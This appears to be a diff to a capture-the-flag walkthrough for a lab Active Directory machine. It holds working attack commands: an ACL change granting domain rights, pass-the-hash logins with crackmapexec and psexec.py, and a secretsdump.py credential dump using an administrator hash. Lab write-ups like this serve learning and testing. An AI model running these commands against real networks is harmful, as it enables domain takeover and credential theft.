@@ -50,6 +50,7 @@ Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -Princi
 
 crackmapexec smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 
-python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
 
+python3 secretsdump.py htb.local/administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6
 
